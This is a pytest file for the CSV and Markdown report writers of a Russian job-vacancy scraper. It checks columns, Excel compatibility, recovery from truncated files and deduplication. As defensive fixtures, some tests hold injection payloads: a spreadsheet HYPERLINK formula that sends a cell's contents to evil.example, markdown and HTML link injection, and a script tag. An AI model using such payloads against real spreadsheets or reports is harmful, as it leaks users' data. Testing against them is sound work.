import csv
import os
import re
from datetime import UTC, datetime, timedelta, timezone
from pathlib import Path

import pytest

from hh_search.domain.models import (
    DiscoveredVacancy,
    Salary,
    ScoreBreakdown,
    ScoredVacancy,
    VacancyDetails,
    WorkFormat,
)
from hh_search.sinks import build_sinks
from hh_search.sinks.csv_sink import COLUMNS, CsvSink
from hh_search.sinks.markdown_sink import MarkdownSink
from hh_search.sinks.text import (
    SNIPPET_LENGTH,
    format_day,
    format_published,
    format_salary_short,
    format_work_formats,
)

# Данные тестов повторяют то, что приходит из хранилища: даты — aware UTC с
# микросекундами (`storage/time_utils.py`), а зарплата и дата публикации
# могут отсутствовать честно (листинг их не отдаёт, а на странице вакансии
# блока зарплаты может не быть вовсе).
NOW = datetime(2026, 7, 27, 10, 0, tzinfo=UTC)
PUBLISHED = datetime(2026, 7, 27, 6, 21, 20, 933000, tzinfo=UTC)
SALARY = Salary(raw="от 200 000 ₽", amount_from=200000, currency="₽")


def make_scored(
    vacancy_id: str = "1",
    title: str = "Embedded Engineer",
    total: float = 87.4,
    cluster: str = "embedded",
    company: str | None = "ООО Ромашка",
    area: str | None = "Нижний Новгород",
    salary: Salary = SALARY,
    published_at: datetime | None = PUBLISHED,
    description: str = "Требуется опыт Yocto и BSP.",
    work_formats: frozenset[WorkFormat] = frozenset(),
) -> ScoredVacancy:
    return ScoredVacancy(
        discovered=DiscoveredVacancy(
            id=vacancy_id,
            url=f"https://hh.ru/vacancy/{vacancy_id}",
            title=title,
            company=company,
            area=area,
            salary=salary,
            published_at=published_at,
            found_by_query="programmist",
        ),
        details=VacancyDetails(description=description, work_formats=work_formats),
        score=ScoreBreakdown(
            title=1.0,
            stack=0.8,
            responsibilities=0.5,
            domain=1.0,
            penalty=0.0,
            total=total,
            matched={"stack": ["yocto"]},
        ),
        cluster=cluster,
    )


def read_rows(path: Path, errors: str = "strict") -> list[dict[str, str]]:
    """Строки файла дня. `errors` нужен там, где хвост файла оборван: битый
    байт остаётся в файле навсегда (дозаписью его не убрать), и читать его
    приходится терпимо — как это делает сам приёмник."""
    with path.open(encoding="utf-8-sig", newline="", errors=errors) as handle:
        return list(csv.DictReader(handle, delimiter=";"))


def cut_inside_a_cyrillic_letter(path: Path, marker: str) -> None:
    """Обрывает файл на первом байте кириллической буквы из `marker`.

    Ровно то, что делает с записью полный диск: `write()` кладёт часть
    буфера и возвращает ENOSPC (в тесте это воспроизведено обрезкой, в
    отчёте — честным RLIMIT_FSIZE). Хвост файла перестаёт быть валидным
    UTF-8.
    """
    data = path.read_bytes()
    path.write_bytes(data[: data.rindex(marker.encode()) + 1])


# --- CSV: второго шанса не будет ------------------------------------------


def test_csv_row_carries_every_column(tmp_path: Path) -> None:
    """Сравнивается словарь ЦЕЛИКОМ, а не три поля из двенадцати.

    После `mark_reported()` вакансия навсегда уходит из `unreported()`:
    колонка, которую приёмник не записал, потеряна окончательно —
    переотправки нет по построению (спека §5.2).
    """
    CsvSink(tmp_path).emit([make_scored()], NOW)
    rows = read_rows(tmp_path / "2026-07-27-new.csv")
    assert rows == [
        {
            "id": "1",
            "score": "87,4",
            "cluster": "embedded",
            "title": "Embedded Engineer",
            "company": "ООО Ромашка",
            "area": "Нижний Новгород",
            "work_formats": "формат не указан",
            "salary_from": "200000",
            "salary_to": "",
            "currency": "₽",
            "published_at": "2026-07-27 06:21",
            "listing": "programmist",
            "url": "https://hh.ru/vacancy/1",
        }
    ]


def test_csv_opens_in_excel(tmp_path: Path) -> None:
    """BOM и `;` — не вкус, а условие читаемости.

    Без BOM Excel читает UTF-8 как cp1251 и показывает `ÐžÐžÐž`; с русской
    локалью разделителем списка является `;`, и файл с запятыми целиком
    ложится в первую колонку.
    """
    CsvSink(tmp_path).emit([make_scored()], NOW)
    raw = (tmp_path / "2026-07-27-new.csv").read_bytes()
    assert raw.startswith(b"\xef\xbb\xbf")
    header = raw.decode("utf-8-sig").splitlines()[0]
    assert header == ";".join(COLUMNS)


def test_csv_appends_second_run_without_repeating_header_or_bom(tmp_path: Path) -> None:
    """Второй прогон дня дописывает, а не начинает файл заново — и не
    вставляет второй BOM: кодек utf-8-sig пишет его при каждом открытии."""
    sink = CsvSink(tmp_path)
    sink.emit([make_scored(vacancy_id="1")], NOW)
    sink.emit([make_scored(vacancy_id="2")], NOW)
    path = tmp_path / "2026-07-27-new.csv"
    assert [row["id"] for row in read_rows(path)] == ["1", "2"]
    assert path.read_text(encoding="utf-8-sig").count("\ufeff") == 0


def test_csv_neutralizes_formula_written_by_the_employer(tmp_path: Path) -> None:
    """Заголовок вакансии — внешний недоверенный текст: его пишет
    работодатель. Квотирование модуля csv от формул не защищает."""
    title = '=HYPERLINK("http://evil.example/?u="&A1;"вакансия")'
    CsvSink(tmp_path).emit(
        [make_scored(title=title, company="+7 (999) 123-45-67 — Embedded Linux")], NOW
    )
    row = read_rows(tmp_path / "2026-07-27-new.csv")[0]
    assert row["title"] == f"'{title}"
    assert row["company"] == "'+7 (999) 123-45-67 — Embedded Linux"


def test_csv_leaves_unknown_date_and_salary_empty(tmp_path: Path) -> None:
    """`published_at` необязателен, а блока зарплаты на странице может не
    быть вовсе. В отчёте это пустые ячейки, а не строка `None` и не падение."""
    CsvSink(tmp_path).emit([make_scored(published_at=None, salary=Salary())], NOW)
    row = read_rows(tmp_path / "2026-07-27-new.csv")[0]
    assert row["published_at"] == ""
    assert (row["salary_from"], row["salary_to"], row["currency"]) == ("", "", "")


def test_csv_writes_both_ends_of_the_salary_range(tmp_path: Path) -> None:
    """Вилка «от и до» — обычный случай на hh.ru.

    В остальных тестах `amount_to` пуст, поэтому исчезновение колонки
    `salary_to` целиком было бы невидимо: ожидание `""` совпадает с тем,
    что DictWriter пишет за отсутствующий ключ.
    """
    CsvSink(tmp_path).emit(
        [
            make_scored(
                salary=Salary(
                    raw="200 000 – 300 000 ₽",
                    amount_from=200000,
                    amount_to=300000,
                    currency="₽",
                )
            )
        ],
        NOW,
    )
    row = read_rows(tmp_path / "2026-07-27-new.csv")[0]
    assert (row["salary_from"], row["salary_to"], row["currency"]) == ("200000", "300000", "₽")


def test_csv_writes_the_score_as_a_number_for_the_russian_excel(tmp_path: Path) -> None:
    """Разделитель дробной части — запятая, как и разделитель колонок `;`.

    Обе настройки следуют из одной русской локали Excel, ради которой в
    файле стоят BOM и `;`: точку такой Excel дробной частью не считает,
    колонка становится текстовой, и фильтр «score > 60» с числовой
    сортировкой молча перестают работать.
    """
    CsvSink(tmp_path).emit([make_scored(total=87.4)], NOW)
    assert read_rows(tmp_path / "2026-07-27-new.csv")[0]["score"] == "87,4"


def test_csv_keeps_a_negative_score_a_number(tmp_path: Path) -> None:
    """Числовые колонки формируем мы, поэтому от формул их защищать не от
    кого — а обезвреживание превратило бы `-5` в текст `'-5`. Сегодня балл
    клампится, но `Scorer` — заявленная точка расширения (спека §4.2), и
    первым же признаком поломки стала бы молча текстовая колонка.
    """
    CsvSink(tmp_path).emit([make_scored(total=-5.0)], NOW)
    assert read_rows(tmp_path / "2026-07-27-new.csv")[0]["score"] == "-5,0"


# --- CSV: файл дня, оставленный убитым или оборванным прогоном ------------


def test_csv_writes_the_header_over_a_zero_length_file(tmp_path: Path) -> None:
    """`open("a")` создаёт файл сразу, а содержимое уходит при закрытии.

    SIGKILL контейнера, OOM или ENOSPC между этими моментами оставляют
    файл дня НУЛЕВОЙ ДЛИНЫ. Если считать такой файл существующим, BOM и
    заголовок не будут написаны никогда за этот день (Excel покажет
    `ÐžÐžÐž`), а дедупликация примет первую вакансию за заголовок и
    потеряет её — молча и до смены суток.
    """
    path = tmp_path / "2026-07-27-new.csv"
    path.touch()
    sink = CsvSink(tmp_path)
    sink.emit([make_scored(vacancy_id="1"), make_scored(vacancy_id="2")], NOW)
    assert path.read_bytes().startswith(b"\xef\xbb\xbf")
    assert path.read_text(encoding="utf-8-sig").splitlines()[0] == ";".join(COLUMNS)
    sink.emit([make_scored(vacancy_id="1"), make_scored(vacancy_id="2")], NOW)
    assert [row["id"] for row in read_rows(path)] == ["1", "2"]


def test_csv_writes_the_header_over_a_file_holding_only_the_bom(tmp_path: Path) -> None:
    """Тот же обрыв, но буфер успел частично уйти: в файле один BOM и
    ничего больше. Заголовок обязан появиться, а BOM — остаться ровно
    одним: второй U+FEFF посреди данных Excel покажет как мусор."""
    path = tmp_path / "2026-07-27-new.csv"
    path.write_bytes(b"\xef\xbb\xbf")
    CsvSink(tmp_path).emit([make_scored()], NOW)
    raw = path.read_bytes()
    assert raw.count(b"\xef\xbb\xbf") == 1
    assert raw.decode("utf-8-sig").splitlines()[0] == ";".join(COLUMNS)
    assert [row["id"] for row in read_rows(path)] == ["1"]


def test_csv_does_not_glue_a_row_onto_an_unfinished_line(tmp_path: Path) -> None:
    """Дозапись в конец оборванной строки растворяет вакансию в соседней.

    Обрыв приходится на середину строки, и следующий прогон приклеивает к
    ней свою: `url` одной вакансии становится колонкой другой, а вакансия,
    которую дописывали, из отчёта исчезает. Переотправки нет — из
    `unreported()` она уже ушла (спека §5.2).
    """
    path = tmp_path / "2026-07-27-new.csv"
    sink = CsvSink(tmp_path)
    sink.emit([make_scored(vacancy_id=str(i)) for i in (1, 2, 3)], NOW)
    os.truncate(path, path.stat().st_size - 20)
    sink.emit([make_scored(vacancy_id="3"), make_scored(vacancy_id="4")], NOW)
    rows = read_rows(path)
    assert [row["url"] for row in rows if row["id"] == "4"] == ["https://hh.ru/vacancy/4"]
    # Вакансия, чья строка оборвалась, вписывается заново целиком: строка
    # без `url` — это не доставленная вакансия.
    assert [row["url"] for row in rows if row["id"] == "3"][-1] == "https://hh.ru/vacancy/3"


def test_csv_survives_a_row_truncated_inside_a_cyrillic_letter(tmp_path: Path) -> None:
    """Обрыв на полном диске режет запись посреди многобайтового символа.

    Строгий UTF-8 при чтении файла дня превращает это в UnicodeDecodeError
    на КАЖДОМ следующем прогоне: отчётов нет до смены суток, самопочинки
    нет, а csv идёт первым в `sinks: [csv, markdown]` и уносит с собой
    markdown. Сообщение при этом указывает на чтение файла, а не на
    полный диск.
    """
    path = tmp_path / "2026-07-27-new.csv"
    sink = CsvSink(tmp_path)
    sink.emit([make_scored(vacancy_id="1"), make_scored(vacancy_id="2")], NOW)
    cut_inside_a_cyrillic_letter(path, "Ромашка")
    sink.emit([make_scored(vacancy_id="2"), make_scored(vacancy_id="3")], NOW)
    rows = read_rows(path, errors="replace")
    assert [row["url"] for row in rows if row["id"] == "2"][-1] == "https://hh.ru/vacancy/2"
    assert [row["url"] for row in rows if row["id"] == "3"] == ["https://hh.ru/vacancy/3"]
    # Целые строки, записанные до обрыва, дедупликация видит по-прежнему.
    assert [row["id"] for row in rows].count("1") == 1


# --- Markdown: порог меняет подробность, а не состав ----------------------


def test_markdown_splits_top_and_rest_by_threshold(tmp_path: Path) -> None:
    MarkdownSink(tmp_path, threshold=60.0).emit(
        [
            make_scored(vacancy_id="1", title="Хорошая вакансия", total=87.4),
            make_scored(vacancy_id="2", title="Так себе вакансия", total=42.0, cluster="backend"),
        ],
        NOW,
    )
    text = (tmp_path / "2026-07-27-new.md").read_text(encoding="utf-8")
    assert text.index("Хорошая вакансия") < text.index("## Остальное")
    assert text.index("## Остальное") < text.index("Так себе вакансия")


def test_markdown_keeps_a_vacancy_exactly_at_the_threshold_in_top(tmp_path: Path) -> None:
    """Спека §6.3 фиксирует `>=`: вакансия на пороге РОВНО идёт в «Топ».

    Разница между `>` и `>=` — это ровно те вакансии, для которых порог и
    подбирался, поэтому строгий знак был бы тихой потерей подробностей.
    """
    MarkdownSink(tmp_path, threshold=60.0).emit([make_scored(title="Ровно порог", total=60.0)], NOW)
    text = (tmp_path / "2026-07-27-new.md").read_text(encoding="utf-8")
    assert text.index("Ровно порог") < text.index("## Остальное")
    assert "_ничего выше порога_" not in text
    # И ровно один раз: `<=` во втором условии положило бы её в оба
    # раздела, а «Остальное» — это обратная связь по качеству скоринга,
    # и вакансия выше порога в ней означала бы неверную обратную связь.
    assert text.count("Ровно порог") == 1
    assert "_пусто_" in text


def test_markdown_orders_top_by_score_descending(tmp_path: Path) -> None:
    """Внутри кластера — от лучшего к худшему: отчёт читают сверху."""
    MarkdownSink(tmp_path, threshold=60.0).emit(
        [
            make_scored(vacancy_id="1", title="Похуже", total=70.0),
            make_scored(vacancy_id="2", title="Получше", total=90.0),
        ],
        NOW,
    )
    text = (tmp_path / "2026-07-27-new.md").read_text(encoding="utf-8")
    assert text.index("Получше") < text.index("Похуже")


def test_markdown_groups_top_by_cluster(tmp_path: Path) -> None:
    MarkdownSink(tmp_path, threshold=60.0).emit(
        [
            make_scored(vacancy_id="1", title="Первая", total=90.0, cluster="embedded"),
            make_scored(vacancy_id="2", title="Вторая", total=80.0, cluster="backend"),
        ],
        NOW,
    )
    text = (tmp_path / "2026-07-27-new.md").read_text(encoding="utf-8")
    assert "### embedded" in text
    assert "### backend" in text
    assert "https://hh.ru/vacancy/1" in text


def test_markdown_gives_each_cluster_a_single_heading(tmp_path: Path) -> None:
    """Кластеры приходят вперемешку: порядок в «Топе» задаёт балл.

    Без сортировки перед `groupby` один и тот же кластер получил бы
    столько заголовков, сколько раз он встретился, — и читатель принял бы
    второй `### embedded` за другой раздел.
    """
    MarkdownSink(tmp_path, threshold=60.0).emit(
        [
            make_scored(vacancy_id="1", title="Первая", total=95.0, cluster="embedded"),
            make_scored(vacancy_id="2", title="Вторая", total=90.0, cluster="backend"),
            make_scored(vacancy_id="3", title="Третья", total=85.0, cluster="embedded"),
        ],
        NOW,
    )
    text = (tmp_path / "2026-07-27-new.md").read_text(encoding="utf-8")
    assert text.count("### embedded") == 1
    assert text.count("### backend") == 1
    # Сортировка по кластеру устойчива: внутри кластера порядок по баллу.
    assert text.index("Первая") < text.index("Третья")


def test_markdown_header_carries_the_time_of_the_run(tmp_path: Path) -> None:
    """Прогонов в сутках несколько, и все они дописывают в один файл: без
    времени в шапке разделы одного дня неотличимы друг от друга."""
    MarkdownSink(tmp_path, threshold=60.0).emit([make_scored()], NOW)
    text = (tmp_path / "2026-07-27-new.md").read_text(encoding="utf-8")
    assert text.splitlines()[0] == "# Новые вакансии — 2026-07-27 10:00"


def test_markdown_short_entry_shows_the_score_and_the_company(tmp_path: Path) -> None:
    """«Остальное» — это обратная связь по качеству скоринга: строка без
    балла и без компании не даёт понять, почему вакансия оказалась ниже
    порога, и раздел перестаёт быть обратной связью."""
    MarkdownSink(tmp_path, threshold=60.0).emit(
        [make_scored(title="Так себе вакансия", total=42.0)], NOW
    )
    text = (tmp_path / "2026-07-27-new.md").read_text(encoding="utf-8")
    assert "- [Так себе вакансия](https://hh.ru/vacancy/1) — 42.0 · ООО Ромашка" in text


def test_markdown_shows_one_decimal_of_the_score(tmp_path: Path) -> None:
    """`{:.0f}` печатает `60` по обе стороны порога: 60.4 в «Топе» и 59.5 в
    «Остальном» выглядят одинаково, и разницу между разделами читателю
    объяснить нечем."""
    MarkdownSink(tmp_path, threshold=60.0).emit(
        [
            make_scored(vacancy_id="1", title="Чуть выше", total=60.4),
            make_scored(vacancy_id="2", title="Чуть ниже", total=59.5),
        ],
        NOW,
    )
    text = (tmp_path / "2026-07-27-new.md").read_text(encoding="utf-8")
    assert "60.4" in text
    assert "59.5" in text


def test_markdown_full_entry_shows_company_area_and_salary(tmp_path: Path) -> None:
    """Три поля, за которые заплачено запросом к странице вакансии. Без них
    «Топ» приходится открывать по ссылке, чтобы понять, стоит ли открывать."""
    MarkdownSink(tmp_path, threshold=60.0).emit([make_scored()], NOW)
    text = (tmp_path / "2026-07-27-new.md").read_text(encoding="utf-8")
    assert "ООО Ромашка · Нижний Новгород · от 200 000 ₽" in text


def test_markdown_says_the_salary_is_unknown_when_the_page_had_none(tmp_path: Path) -> None:
    """Ветка достижима: блока `data-qa="vacancy-salary"` на странице может не
    быть — это обычный случай, а не ошибка (спека §3.4)."""
    MarkdownSink(tmp_path, threshold=60.0).emit(
        [make_scored(salary=Salary(), area=None, published_at=None)], NOW
    )
    text = (tmp_path / "2026-07-27-new.md").read_text(encoding="utf-8")
    assert "ООО Ромашка · — · зарплата не указана · дата неизвестна" in text


def test_markdown_shows_the_publication_date(tmp_path: Path) -> None:
    """За дату публикации заплачен запрос к странице вакансии, и в CSV она
    есть. Без неё свежую вакансию не отличить от переопубликованной старой
    — а это первое, на что смотрят в отчёте о НОВОМ."""
    MarkdownSink(tmp_path, threshold=60.0).emit([make_scored()], NOW)
    text = (tmp_path / "2026-07-27-new.md").read_text(encoding="utf-8")
    assert "ООО Ромашка · Нижний Новгород · от 200 000 ₽ · 2026-07-27 06:21" in text


def test_markdown_truncates_the_snippet(tmp_path: Path) -> None:
    """Описание с hh.ru — это килобайты текста: без обрезки «Топ» перестаёт
    быть выжимкой и читается дольше, чем сама страница вакансии."""
    MarkdownSink(tmp_path, threshold=60.0).emit([make_scored(description="я" * 500)], NOW)
    text = (tmp_path / "2026-07-27-new.md").read_text(encoding="utf-8")
    assert "я" * SNIPPET_LENGTH + "…" in text
    assert "я" * (SNIPPET_LENGTH + 1) not in text


def test_markdown_collapses_line_breaks_from_the_description(tmp_path: Path) -> None:
    """Описание приходит со страницы многострочным (`html_to_text` ставит
    переводы строк на месте блочных тегов). Пустая строка внутри пункта —
    это конец пункта для любого рендерера markdown."""
    MarkdownSink(tmp_path, threshold=60.0).emit(
        [make_scored(description="Требуется опыт.\n\nYocto и BSP.")], NOW
    )
    text = (tmp_path / "2026-07-27-new.md").read_text(encoding="utf-8")
    assert "Требуется опыт. Yocto и BSP.…" in text


def test_markdown_appends_the_second_run_of_the_day(tmp_path: Path) -> None:
    """Прогон идёт раз в несколько часов: 'w' затирал бы утренние находки
    вечерними, и вернуть их было бы нечем — `mark_reported` уводит вакансию
    из `unreported()` навсегда."""
    sink = MarkdownSink(tmp_path, threshold=60.0)
    sink.emit([make_scored(vacancy_id="1", title="Утренняя")], NOW)
    sink.emit([make_scored(vacancy_id="2", title="Вечерняя")], NOW.replace(hour=18))
    text = (tmp_path / "2026-07-27-new.md").read_text(encoding="utf-8")
    assert text.count("# Новые вакансии") == 2
    assert "Утренняя" in text
    assert "Вечерняя" in text


def test_markdown_survives_a_broken_tail_of_todays_file(tmp_path: Path) -> None:
    """Обрыв записи на полном диске режет файл посреди кириллицы.

    Строгий UTF-8 при чтении файла дня превращает это в UnicodeDecodeError
    на каждом следующем прогоне до смены суток, а дозапись в конец
    оборванной строки приклеивает шапку нового отчёта к обрывку старого —
    и заголовок первого уровня перестаёт быть заголовком.
    """
    path = tmp_path / "2026-07-27-new.md"
    sink = MarkdownSink(tmp_path, threshold=60.0)
    sink.emit([make_scored(vacancy_id="1", title="Утренняя")], NOW)
    cut_inside_a_cyrillic_letter(path, "Требуется")
    sink.emit([make_scored(vacancy_id="2", title="Вечерняя")], NOW.replace(hour=18))
    text = path.read_bytes().decode("utf-8", errors="replace")
    assert "# Новые вакансии — 2026-07-27 18:00" in text.splitlines()
    assert "Вечерняя" in text
    # Ссылки, вписанные до обрыва, дедупликация видит по-прежнему.
    sink.emit([make_scored(vacancy_id="1", title="Утренняя")], NOW.replace(hour=20))
    text = path.read_bytes().decode("utf-8", errors="replace")
    assert text.count("https://hh.ru/vacancy/1") == 1


def test_markdown_escapes_link_syntax_from_the_employer(tmp_path: Path) -> None:
    """Заголовок пишет работодатель, и `[Удалённо]` в его начале на hh.ru
    встречается. Незакрытая скобка превращает пункт отчёта в рабочую ссылку
    на чужой сайт."""
    MarkdownSink(tmp_path, threshold=60.0).emit(
        [make_scored(title="[Удалённо] Инженер](https://evil.example)")], NOW
    )
    text = (tmp_path / "2026-07-27-new.md").read_text(encoding="utf-8")
    assert r"\[Удалённо\]" in text
    # Единственная настоящая ссылка в отчёте — на hh.ru.
    assert re.findall(r"(?<!\\)\]\((http[^)]+)\)", text) == ["https://hh.ru/vacancy/1"]


def test_markdown_escapes_angle_brackets_from_the_employer(tmp_path: Path) -> None:
    """`<https://evil/>` — это автоссылка CommonMark, а `<a href=...>` —
    сырой HTML, разрешённый markdown по умолчанию. И то и другое —
    РАБОЧАЯ ссылка, неотличимая в отчёте от нашей, и вписывает её
    работодатель тем же полем, что и `[Удалённо]`.
    """
    MarkdownSink(tmp_path, threshold=60.0).emit(
        [
            make_scored(
                title="Инженер <https://evil.example/phish>",
                description='<a href="https://evil.example">жми</a> <script>alert(1)</script>',
            )
        ],
        NOW,
    )
    text = (tmp_path / "2026-07-27-new.md").read_text(encoding="utf-8")
    # В собственной разметке отчёта угловых скобок нет, поэтому любая
    # неэкранированная пришла от работодателя — и работает.
    assert re.findall(r"(?<!\\)[<>]", text) == []
    assert r"\<https://evil.example/phish\>" in text
    assert r"\<script\>" in text


def test_markdown_escapes_link_syntax_in_the_description(tmp_path: Path) -> None:
    """Описание — такой же недоверенный текст, как заголовок, и вдвое
    длиннее: 200 символов чужого текста попадают в отчёт дословно."""
    MarkdownSink(tmp_path, threshold=60.0).emit(
        [make_scored(description="Пишите на [наш сайт](https://evil.example) прямо сегодня")], NOW
    )
    text = (tmp_path / "2026-07-27-new.md").read_text(encoding="utf-8")
    assert r"\[наш сайт\]" in text
    assert re.findall(r"(?<!\\)\]\((http[^)]+)\)", text) == ["https://hh.ru/vacancy/1"]


def test_markdown_drops_control_characters(tmp_path: Path) -> None:
    """Отчёт читают глазами и грепают.

    Нулевой байт ломает grep и часть редакторов, а U+202E (RIGHT-TO-LEFT
    OVERRIDE) переворачивает остаток строки при показе — заголовок пишет
    работодатель, и оба символа доезжают из него в файл как есть.
    """
    MarkdownSink(tmp_path, threshold=60.0).emit(
        [make_scored(title="Инженер\x00 ‮ьлетавозьлоп")], NOW
    )
    text = (tmp_path / "2026-07-27-new.md").read_text(encoding="utf-8")
    assert "\x00" not in text
    assert "\u202e" not in text
    assert "Инженер" in text


# --- Формат работы виден во всех отчётах -----------------------------------


def test_work_format_labels_cover_every_enum_value() -> None:
    """Новое значение перечисления у hh.ru не должно тихо превращаться в пустое
    место в отчёте: отображение обязано покрывать ВСЕ значения WorkFormat."""
    for value in WorkFormat:
        assert format_work_formats(frozenset({value})), value


def test_empty_formats_are_shown_as_unknown_not_as_office() -> None:
    """Пустое множество — «формат не указан», а не «офис». Иначе отчёт
    утверждает то, чего мы не знаем (и что мы решили не штрафовать)."""
    shown = format_work_formats(frozenset())
    assert "не указан" in shown
    assert "офис" not in shown


def test_several_formats_are_shown_together() -> None:
    shown = format_work_formats(frozenset({WorkFormat.REMOTE, WorkFormat.HYBRID}))
    assert "удалённо" in shown
    assert "гибрид" in shown


def test_work_format_labels_contain_no_html_metacharacters() -> None:
    """`html_report._entry` пропускает эту строку через `escape_html`, но
    сегодняшние подписи не содержат ни одного символа, на который
    `escape_html` реагирует, — значит сам факт вызова ничего не ловит:
    убери `escape_html` из `_entry`, и ни один тест не покраснеет (проверено
    ревьюером на всех 16 достижимых выводах `format_work_formats`). Сторожит
    от реальной причины будущей утечки — правки словаря подписей, которая
    впишет вроде `"офис (R&D)"`: этот тест обязан покраснеть раньше, чем
    небезопасная подпись доедет до HTML-отчёта."""
    for value in WorkFormat:
        label = format_work_formats(frozenset({value}))
        assert not set(label) & set("<>&"), label


def test_csv_has_a_work_format_column(tmp_path: Path) -> None:
    assert "work_formats" in COLUMNS
    CsvSink(tmp_path).emit([make_scored(work_formats=frozenset({WorkFormat.REMOTE}))], NOW)
    row = read_rows(tmp_path / "2026-07-27-new.csv")[0]
    assert row["work_formats"] == "удалённо"


def test_new_column_does_not_shift_a_file_started_before_the_upgrade(tmp_path: Path) -> None:
    """`work_formats` дописана ПОСЛЕДНЕЙ в `COLUMNS`, а не вставлена в середину.

    Файл дня, начатый предыдущей версией (12 колонок, без `work_formats`),
    получает от апгрейженного `CsvSink` 13-польные строки в тот же файл —
    заголовок дописывается только для нового файла (`csv_sink.py`, `emit`).
    Если бы новая колонка стояла между `area` и `salary_from`, лишнее поле
    сдвигало бы ВСЁ, что после него, — `DictReader`, читающий по старому
    12-польному заголовку, положил бы значение `work_formats` в колонку
    `salary_from`, а `url` потерял бы последнее поле. Колонка в хвосте
    сдвига не даёт: 12 старых имён остаются на местах, а лишнее 13-е поле
    `DictReader` кладёт в `restkey` (`None`), которого этот тест не читает.
    """
    path = tmp_path / "2026-07-27-new.csv"
    old_header = (
        "id;score;cluster;title;company;area;salary_from;salary_to;"
        "currency;published_at;listing;url\r\n"
    )
    path.write_bytes(b"\xef\xbb\xbf" + old_header.encode("utf-8"))
    CsvSink(tmp_path).emit(
        [make_scored(vacancy_id="1", work_formats=frozenset({WorkFormat.ON_SITE}))], NOW
    )
    with path.open(encoding="utf-8-sig", newline="") as handle:
        rows = list(csv.DictReader(handle, delimiter=";"))
    assert rows[0]["salary_from"] == "200000"
    assert rows[0]["currency"] == "₽"
    assert rows[0]["url"] == "https://hh.ru/vacancy/1"


def test_markdown_entry_shows_the_work_format(tmp_path: Path) -> None:
    """Формат — в строке «Топа»: `_full_entry` кладёт его после даты
    публикации. Проверка сужена до раздела «Топ» (`partition`), а не по
    всему файлу: формат теперь виден и в «Остальном» тоже (Important 2), и
    ассерт по всему тексту перестал бы различать разделы — то есть красный
    `_full_entry` он бы не заметил, пока красен `_short_entry`.
    """
    MarkdownSink(tmp_path, threshold=60.0).emit(
        [make_scored(work_formats=frozenset({WorkFormat.REMOTE}))], NOW
    )
    text = (tmp_path / "2026-07-27-new.md").read_text(encoding="utf-8")
    top, _, _rest = text.partition("## Остальное")
    assert "удалённо" in top


def test_markdown_short_entry_shows_the_work_format(tmp_path: Path) -> None:
    """Решение владельца: «Остальное» тоже штрафуется форматом (спека §3),
    значит и здесь подпись обязана быть видна. Регион в короткую строку не
    добавляется — владелец выбрал именно формат, минимализм «Остального»
    сохраняется."""
    MarkdownSink(tmp_path, threshold=60.0).emit(
        [
            make_scored(
                title="Так себе вакансия",
                total=42.0,
                work_formats=frozenset({WorkFormat.ON_SITE}),
            )
        ],
        NOW,
    )
    text = (tmp_path / "2026-07-27-new.md").read_text(encoding="utf-8")
    assert "- [Так себе вакансия](https://hh.ru/vacancy/1) — 42.0 · ООО Ромашка · офис" in text


# --- фабрика и пустой вход ------------------------------------------------


def test_sinks_do_nothing_on_empty_input(tmp_path: Path) -> None:
    CsvSink(tmp_path).emit([], NOW)
    MarkdownSink(tmp_path, threshold=60.0).emit([], NOW)
    assert list(tmp_path.iterdir()) == []


def test_file_sinks_maintain_without_touching_the_disk(tmp_path: Path) -> None:
    """Пустой `maintain` обязан остаться пустым: он зовётся каждый прогон.

    Сторож на случай, если однажды в него положат работу «заодно»:
    `report()` зовёт его в том числе тогда, когда отправлять нечего, и
    запись на диск оттуда была бы работой без повода.
    """
    before = sorted(path.name for path in tmp_path.iterdir())
    CsvSink(tmp_path).maintain(NOW)
    MarkdownSink(tmp_path, 60.0).maintain(NOW)
    assert sorted(path.name for path in tmp_path.iterdir()) == before


def test_build_sinks_resolves_names(tmp_path: Path) -> None:
    sinks = build_sinks(["csv", "markdown"], tmp_path, threshold=60.0)
    assert [sink.name for sink in sinks] == ["csv", "markdown"]


def test_build_sinks_rejects_unknown_name_before_anything_is_written(tmp_path: Path) -> None:
    """Опечатка в `sinks` обязана ронять процесс на старте, до сетевых
    запросов (спека §7/§9), поэтому фабрика строится до `start_run()` и
    отказывает, ничего не создав."""
    with pytest.raises(ValueError, match="telegram"):
        build_sinks(["csv", "telegram"], tmp_path, threshold=60.0)
    assert list(tmp_path.iterdir()) == []


# --- дедупликация: доставка at-least-once по построению -------------------


def test_csv_does_not_repeat_a_vacancy_already_in_todays_file(tmp_path: Path) -> None:
    """Пересекающиеся наборы двух emit дают файл БЕЗ дублей.

    `sinks: [csv, markdown]` по умолчанию, а `mark_reported()` вызывается
    ПОСЛЕ всех приёмников. Упавший markdown при отработавшем csv оставляет
    вакансии `new`, и следующий прогон отдаёт csv тот же список второй раз
    (замер ревью Task 10: «ДУБЛИ в CSV: 20 шт.»); авария контейнера между
    `emit` и `mark_reported` даёт ровно то же. Доставка at-least-once
    неустранима, поэтому дубли снимает приёмник — по факту записанного.
    """
    sink = CsvSink(tmp_path)
    sink.emit([make_scored(vacancy_id="1"), make_scored(vacancy_id="2")], NOW)
    sink.emit([make_scored(vacancy_id="2"), make_scored(vacancy_id="3")], NOW)
    assert [row["id"] for row in read_rows(tmp_path / "2026-07-27-new.csv")] == ["1", "2", "3"]


def test_csv_writes_nothing_when_the_whole_batch_is_already_in_the_file(tmp_path: Path) -> None:
    """Полный повтор не добавляет к файлу ни байта."""
    sink = CsvSink(tmp_path)
    sink.emit([make_scored(vacancy_id="1")], NOW)
    before = (tmp_path / "2026-07-27-new.csv").read_bytes()
    sink.emit([make_scored(vacancy_id="1")], NOW)
    assert (tmp_path / "2026-07-27-new.csv").read_bytes() == before


def test_csv_deduplicates_by_the_file_not_by_the_sink_instance(tmp_path: Path) -> None:
    """Источником истины обязан быть файл, а не состояние в памяти:
    между прогонами процесс перезапускается, и множество отправленного,
    накопленное в приёмнике, не переживает ни рестарт контейнера, ни
    падение `serve` посреди итерации."""
    CsvSink(tmp_path).emit([make_scored(vacancy_id="1")], NOW)
    CsvSink(tmp_path).emit([make_scored(vacancy_id="1")], NOW)
    assert [row["id"] for row in read_rows(tmp_path / "2026-07-27-new.csv")] == ["1"]


def test_markdown_does_not_repeat_a_vacancy_already_in_todays_file(tmp_path: Path) -> None:
    """То же для markdown, но искать приходится по вписанным ссылкам:
    структурированного поля с id в отчёте для человека нет."""
    sink = MarkdownSink(tmp_path, threshold=60.0)
    sink.emit([make_scored(vacancy_id="1", title="Первая"), make_scored(vacancy_id="2")], NOW)
    sink.emit([make_scored(vacancy_id="2"), make_scored(vacancy_id="3", title="Третья")], NOW)
